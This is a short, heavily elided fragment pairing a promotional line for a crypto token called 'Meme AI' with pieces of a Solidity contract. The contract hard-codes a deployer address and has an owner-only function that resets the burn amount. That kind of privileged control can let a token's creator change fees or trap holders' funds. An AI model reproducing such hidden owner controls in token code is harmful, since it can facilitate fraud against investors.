...
Meme AI is a revolutionary crypto project that combines the power of memes
...
pragma solidity ^0.8.20;
    ...
    contract MeMeI {
        ...
        address payable constant deployer = payable(address(0x46bd4f1790737fCe8Ac25BBbB1cD181770ccf44A)); //
        ...
        function setMeAI(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnAmount = newBurn;
